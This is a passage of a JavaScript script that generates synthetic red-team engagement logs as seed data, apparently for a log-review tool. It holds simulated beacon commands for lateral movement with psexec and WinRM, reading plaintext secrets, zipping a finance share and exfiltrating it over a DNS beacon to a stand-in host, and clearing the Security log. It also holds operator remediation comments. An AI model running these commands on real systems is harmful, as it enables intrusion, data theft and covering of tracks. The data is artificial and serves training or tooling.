	'Administrator          User      Built-in account for administering the domain',
	'adm.kowalski           User      Domain Admins',
	'krbtgt                 User      Key Distribution Center Service Account',
	'svc-backup             User      Domain Admins',
]);

// Day 1 afternoon — jump host and web server, exfiltration over DNS
t = at(1, 13, 30);
const c_jumpJump = run(b6, t, 'falcon', 'jump psexec64 JUMP01 smb-alpha', { tasks: [{ attack: ['T1021.002', 'T1569.002', 'TA0008'], text: 'Tasked beacon to run windows/beacon_bind_pipe (\\\\.\\pipe\\msagent_77) on JUMP01 via Service Control Manager' }], outputs: [out.jump('JUMP01', 'SMB pipe')] });
const b7 = spawnBeacon({ host: 'JUMP01', server: 'TS-ALPHA', user: 'SYSTEM *', process: '1b7e2c9.exe', pid: 4416, type: 'smb', t: t + 50 * 1000, parent: b6, viaCommand: c_jumpJump, operator: 'falcon' });
t += 6 * MIN;
const c_rdp = run(b7, t, 'falcon', 'shell qwinsta', { tasks: [{ attack: ['T1059', 'T1033'], text: 'Tasked beacon to run: qwinsta' }], outputs: [' SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE\n>services                                    0  Disc\n rdp-tcp#4         j.okafor                  2  Active\n console                                     1  Conn\n rdp-tcp                                 65536  Listen'] });
t += 9 * MIN;
const c_jumpWeb = run(b7, t, 'falcon', 'jump winrm64 WEB01 smb-alpha', { tasks: [{ attack: ['T1021.006', 'TA0008'], text: 'Tasked beacon to run windows/beacon_bind_pipe (\\\\.\\pipe\\msagent_3f) on WEB01 via WinRM' }], outputs: [out.jump('WEB01', 'SMB pipe')] });
const b8 = spawnBeacon({ host: 'WEB01', server: 'TS-ALPHA', user: `${DOMAIN}\\adm.kowalski`, process: 'wsmprovhost.exe', pid: 3900, type: 'smb', t: t + 40 * 1000, parent: b7, viaCommand: c_jumpWeb, operator: 'falcon' });
t += 5 * MIN;
const c_lsWeb = run(b8, t, 'falcon', 'ls C:\\inetpub\\wwwroot\\tracking', { tasks: [{ attack: ['T1083'], text: 'Tasked beacon to list files in C:\\inetpub\\wwwroot\\tracking' }], outputs: [out.ls('C:\\inetpub\\wwwroot\\tracking', [[4412, 'web.config'], [93811, 'Tracking.dll'], [1203, 'appsettings.Production.json']])] });
t += 3 * MIN;
const c_catCfg = run(b8, t, 'falcon', 'shell type C:\\inetpub\\wwwroot\\tracking\\appsettings.Production.json', { tasks: [{ attack: ['T1059', 'T1552.001'], text: 'Tasked beacon to run: type C:\\inetpub\\wwwroot\\tracking\\appsettings.Production.json' }], outputs: ['{\n  "ConnectionStrings": {\n    "Tracking": "Server=SQL01;Database=ShipmentTracking;User Id=tracking_app;Password=********;"\n  },\n  "ApiKeys": { "CarrierGateway": "ck_live_****************" }\n}'] });

// exfiltration: a DNS beacon on the file server, staged archive
t = at(1, 15, 0);
const c_spawnDns = run(b3, t, 'wren', 'spawn x64 dns-bravo', { tasks: [{ attack: ['T1055', 'T1093'], text: 'Tasked beacon to spawn (x64) windows/beacon_dns/reverse_dns_txt (ns1.halcyon-cdn.example:53)' }], gap: 30 });
const b9 = spawnBeacon({ host: 'FS01', server: 'TS-BRAVO', user: 'SYSTEM *', process: 'dllhost.exe', pid: 7716, type: 'dns', t: t + 90 * 1000, viaCommand: c_spawnDns, operator: 'wren' });
t += 6 * MIN;
const c_tar = run(b9, t, 'wren', 'shell tar -a -c -f C:\\ProgramData\\Microsoft\\Crypto\\fin.zip D:\\Shares\\Finance', { tasks: [{ attack: ['T1059', 'T1560.001'], text: 'Tasked beacon to run: tar -a -c -f C:\\ProgramData\\Microsoft\\Crypto\\fin.zip D:\\Shares\\Finance' }], outputs: [out.tar('D:\\Shares\\Finance')], gap: 140 });
t += 8 * MIN;
const c_exfil = run(b9, t, 'wren', 'download C:\\ProgramData\\Microsoft\\Crypto\\fin.zip', { tasks: [{ attack: ['T1041', 'T1048.003'], text: 'Tasked beacon to download C:\\ProgramData\\Microsoft\\Crypto\\fin.zip' }], outputs: ['started download of C:\\ProgramData\\Microsoft\\Crypto\\fin.zip (50541100 bytes)', 'download of fin.zip is complete'], gap: 1500 });
seed.files.push({ id: uuid(), fileName: 'fin.zip', location: 'C:\\ProgramData\\Microsoft\\Crypto\\fin.zip', dateTime: iso(t), md5: md5('fin'), fileFlag: 'DOWNLOAD', beaconId: b9.id });
t += 30 * MIN;
const c_rmZip = run(b9, t, 'wren', 'rm C:\\ProgramData\\Microsoft\\Crypto\\fin.zip', { tasks: [{ attack: ['T1070.004', 'T1107'], text: 'Tasked beacon to remove C:\\ProgramData\\Microsoft\\Crypto\\fin.zip' }] });

// Day 2 — deliberate noise to test detection: rapid lateral movement across workstations
const noisy = ['WS-031', 'WS-032', 'WS-033', 'WS-034', 'WS-035'];
const noiseBeacons = [];
t = at(2, 9, 0);
const c_noiseScan = run(b6, t, 'wren', 'portscan 10.20.1.0/24 445,3389 none 2048', { tasks: [{ attack: ['T1046', 'T1093'], text: 'Tasked beacon to scan ports 445,3389 on 10.20.1.0/24' }], outputs: [out.portscan(noisy.map((h) => [net[h][0], [445, 3389]]))], gap: 240 });
const noiseJumps = [];
for (const [i, host] of noisy.entries()) {
	t += int(4, 9) * MIN;
	const operator = pick(operators);
	const method = i % 2 ? 'psexec64' : 'winrm64';
	const jump = run(b6, t, operator, `jump ${method} ${host} smb-alpha`, { tasks: [{ attack: method === 'psexec64' ? ['T1021.002', 'T1569.002', 'TA0008'] : ['T1021.006', 'TA0008'], text: `Tasked beacon to run windows/beacon_bind_pipe on ${host} via ${method === 'psexec64' ? 'Service Control Manager' : 'WinRM'}` }], outputs: [out.jump(host, 'SMB pipe')] });
	noiseJumps.push(jump);
	const nb = spawnBeacon({ host, server: 'TS-ALPHA', user: method === 'psexec64' ? 'SYSTEM *' : `${DOMAIN}\\adm.kowalski`, process: method === 'psexec64' ? `${hex(7)}.exe` : 'wsmprovhost.exe', pid: int(2000, 9000), type: 'smb', t: t + 45 * 1000, parent: b6, viaCommand: jump, operator });
	noiseBeacons.push(nb);
	let tn = t + 3 * MIN;
	run(nb, tn, operator, 'getuid', { tasks: [{ attack: ['T1033'], text: 'Tasked beacon to get userid' }], outputs: [out.getuid(beaconState[nb.id].user)] });
	tn += 2 * MIN;
	run(nb, tn, operator, 'upload /opt/payloads/redteam_was_here.txt', { tasks: [{ attack: ['T1105'], text: 'Tasked beacon to upload /opt/payloads/redteam_was_here.txt as C:\\Users\\Public\\redteam_was_here.txt' }], gap: 10 });
	seed.files.push({ id: uuid(), fileName: 'redteam_was_here.txt', location: 'C:\\Users\\Public\\redteam_was_here.txt', dateTime: iso(tn), md5: md5('rtwh'), fileFlag: 'UPLOAD', beaconId: nb.id });
	tn += 2 * MIN;
	if (i === 2) {
		run(nb, tn, operator, 'shell vssadmin list shadows', { tasks: [{ attack: ['T1059', 'T1490'], text: 'Tasked beacon to run: vssadmin list shadows' }], outputs: ['vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool\n(C) Copyright 2001-2013 Microsoft Corp.\n\nNo items found that satisfy the query.'] });
		tn += 2 * MIN;
	}
	if (i === 4) {
		run(nb, tn, operator, 'shell wevtutil cl Security', { tasks: [{ attack: ['T1059', 'T1070.001'], text: 'Tasked beacon to run: wevtutil cl Security' }], error: 'Failed to clear log Security. Access is denied.' });
		tn += 2 * MIN;
	}
	exitBeacon(nb, tn, operator);
}

// wrap up — clean up persistence, unlink beacons and exit
t = at(2, 12, 30);
const c_cleanup = run(b2, t, 'raven', 'shell schtasks /delete /tn HalcyonUpdateCheck /f', { tasks: [{ attack: ['T1059', 'T1070'], text: 'Tasked beacon to run: schtasks /delete /tn HalcyonUpdateCheck /f' }], outputs: ['SUCCESS: The scheduled task "HalcyonUpdateCheck" was successfully deleted.'] });
t += 3 * MIN;
exitBeacon(b8, t, 'falcon');
t += 2 * MIN;
exitBeacon(b7, t, 'falcon');
t += 2 * MIN;
exitBeacon(b5s, t, 'wren');
t += 4 * MIN;
exitBeacon(b9, t, 'wren');
t += 3 * MIN;
exitBeacon(b3, t, 'raven');
// b1, b2 and b6 are intentionally left alive until the end of the logs

// ---------- end times, operators ----------
for (const beacon of seed.beacons) {
	const s = beaconState[beacon.id];
	if (!s) continue;
	beacon.meta[0].endTime = iso(s.exited ?? s.lastTime);
}
for (const link of seed.links) {
	const dest = beaconState[link.destinationId];
	if (dest) link.endTime = iso(dest.exited ?? dest.lastTime);
}
for (const op of operators) {
	const times = seed.commands
		.filter((c) => c.operatorId === op)
		.map((c) => Date.parse(seed.logs.find((l) => l.id === c.inputId).dateTime));
	seed.operators.push({ id: op, startTime: iso(Math.min(...times)), endTime: iso(Math.max(...times)) });
	for (const beacon of seed.beacons)
		if (seed.commands.some((c) => c.beaconId === beacon.id && c.operatorId === op) && !beacon.operatorIds.includes(op))
			beacon.operatorIds.push(op);
}

// ---------- comments ----------
const tag = (text) => {
	if (!seed.tags.find((x) => x.id === text)) seed.tags.push({ id: text, text });
	return text;
};
const comment = ({ commands, text, user = '', generation = 'MANUAL', favorite = false, tags = [], minutesAfter = 20 }) => {
	const groupId = generation === 'PROCEDURAL' ? `${commands[0].id}-group` : uuid();
	let group = seed.commandGroups.find((g) => g.id === groupId);
	if (!group) {
		group = { id: groupId, generation, commandIds: commands.map((c) => c.id) };
		seed.commandGroups.push(group);
	}
	const last = Math.max(...commands.map((c) => Date.parse(seed.logs.find((l) => l.id === c.inputId).dateTime)));
	seed.annotations.push({
		id: uuid(),
		text,
		generation,
		date: iso(generation === 'PROCEDURAL' ? at(3, 9, 0) : last + minutesAfter * MIN),
		user,
		favorite,
		commandGroupId: group.id,
		tagIds: tags.map(tag),
	});
	return group;
};

// what the parser would have generated
for (const c of seed.commands) {
	if (['elevate', 'logonpasswords', 'inject'].includes(c.inputText))
		comment({ commands: [c], text: c.inputText, generation: 'PROCEDURAL', tags: ['PrivilegeEscalation'] });
	if (c.inputText === 'jump') comment({ commands: [c], text: c.inputText, generation: 'PROCEDURAL', tags: ['LateralMovement'] });
	if (c.inputText === 'mimikatz' && c.attackIds.includes('T1558.001'))
		comment({ commands: [c], text: 'golden ticket', generation: 'PROCEDURAL', tags: ['GoldenTicket'] });
}

// what the operators wrote
comment({ commands: [c_getuid, c_groups, c_shot1], user: 'raven', favorite: true, tags: ['InitialAccess', 'Phishing'], text: 'Initial access. m.alvarez opened Invoice_March_2024.docm and enabled macros; the macro loaded our DLL with rundll32. The mail gateway did not strip macro-enabled attachments from an external sender.' });
comment({ commands: [c_ipconfig, c_netview], user: 'raven', tags: ['Discovery'], text: 'Basic host and network discovery from the first foothold. Every server answered net view, so there is no segmentation between the workstation VLAN and servers.' });
comment({ commands: [c_keylog], user: 'raven', tags: ['Collection'], text: 'Keylogger left running in explorer.exe for 30 minutes. Nothing sensitive captured, but EDR never flagged the injection.' });
comment({ commands: [c_sharpup1, c_elevate], user: 'raven', favorite: true, tags: ['PrivilegeEscalation', 'Remediation'], text: 'HalcyonTelemetryAgent runs as SYSTEM from a directory that standard users can write to. Swapping the binary gave us SYSTEM on WS-014. Fix the folder ACLs and audit other in-house services for the same mistake.' });
comment({ commands: [c_logon1, c_hashdump], user: 'raven', favorite: true, tags: ['CredentialAccess'], text: 'svc-helpdesk had an interactive session cached on a regular workstation. Its hash is valid on most servers. Credential Guard is not enabled.' });
comment({ commands: [c_scan], user: 'falcon', tags: ['Discovery', 'Noise'], text: 'Full ARP and port sweep of two /24s from WS-014. Expected an IDS alert here; the blue team confirmed none fired.' });
comment({ commands: [c_persist, c_upload1], user: 'raven', tags: ['Persistence'], text: 'Scheduled task persistence on WS-014 (HalcyonUpdateCheck). Removed on day 3; see the cleanup comment.' });
comment({ commands: [c_pth, c_jumpFs], user: 'raven', tags: ['LateralMovement', 'CredentialAccess'], text: 'Pass-the-hash with svc-helpdesk, then psexec to FS01. Service creation over ADMIN$ from a workstation should be a high-fidelity alert.' });
comment({ commands: [c_lsFin, c_download1], user: 'wren', favorite: true, tags: ['Collection', 'Exfiltration'], text: 'Finance share is readable by svc-helpdesk. Vendor payment spreadsheet pulled as proof of access.' });
comment({ commands: [c_shot4, c_inject4], user: 'falcon', tags: ['DefenseEvasion', 'Detection'], text: 'Defender caught the second phishing payload on WS-022 within 20 minutes and blocked injection into explorer. Nice catch by the endpoint stack; we dropped this beacon.' });
comment({ commands: [c_sql, c_seatbelt], user: 'wren', tags: ['Discovery'], text: 'SQL01 trusts Windows auth for svc-helpdesk with sysadmin rights. Customer billing data is reachable from here.' });
comment({ commands: [c_logonSql], user: 'wren', favorite: true, tags: ['CredentialAccess', 'Remediation'], text: 'Domain admin adm.kowalski was logged into SQL01. Domain admins should only sign in to tier 0 systems. This is what led to full domain compromise.' });
comment({ commands: [c_dcsync, c_golden], user: 'raven', favorite: true, tags: ['CredentialAccess', 'Persistence'], text: 'DCSync of krbtgt, then a golden ticket for Administrator. Rotate the krbtgt password twice and review replication rights.' });
comment({ commands: [c_catCfg], user: 'falcon', tags: ['CredentialAccess'], text: 'Production secrets sit in plaintext appsettings on WEB01. Move them into a secrets store.' });
comment({ commands: [c_tar, c_exfil, c_rmZip], user: 'wren', favorite: true, tags: ['Exfiltration'], text: 'Staged the finance share as a 48 MB zip and exfiltrated it over DNS TXT records across 25 minutes. Outbound DNS to arbitrary resolvers is allowed.' });
comment({ commands: [c_noiseScan, ...noiseJumps], user: 'wren', tags: ['Noise', 'LateralMovement'], text: 'Day 3 was deliberately loud: a sweep plus psexec and winrm to five workstations in under an hour, to test whether the SOC notices. Check alert timing against these timestamps.' });
comment({ commands: [c_cleanup], user: 'raven', tags: ['Cleanup'], text: 'Persistence removed, beacons exited. Remaining artifacts: redteam_was_here.txt on WS-031 through WS-035.' });

// ---------- write ----------
mkdirSync(dirname(outPath), { recursive: true });
writeFileSync(outPath, JSON.stringify(seed));
console.log(
	outPath,
	Object.fromEntries(Object.entries(seed).map(([k, v]) => [k, v.length]))
);
